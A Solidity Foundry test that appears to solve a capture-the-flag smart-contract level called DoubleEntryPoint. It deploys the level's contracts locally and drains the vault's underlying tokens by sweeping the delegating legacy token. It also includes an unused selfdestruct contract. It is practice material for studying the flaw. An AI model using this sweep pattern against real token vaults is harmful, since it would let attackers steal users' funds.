// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DelegateERC20, DoubleEntryPoint, Forta, LegacyToken, CryptoVault} from "../instances/Ilevel26.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        LegacyToken legacyToken = new LegacyToken();
        Forta forta = new Forta();
        CryptoVault vault = new CryptoVault(msg.sender);
        legacyToken.mint(address(vault), 100);
        DoubleEntryPoint dep = new DoubleEntryPoint(
            address(legacyToken),
            address(vault),
            address(forta),
            msg.sender
        );
        vault.setUnderlying(address(dep));
        legacyToken.delegateToNewContract(DelegateERC20(address(dep)));
        CryptoVault cryptoVault = CryptoVault(dep.cryptoVault());
        // address det = address(cryptoVault.underlying());
        address LGT = dep.delegatedFrom();
        cryptoVault.sweepToken(IERC20(LGT));
        vm.stopBroadcast();
    }
}

contract Destructive {
    function killed() external {
        selfdestruct(payable(address(0)));
    }
}
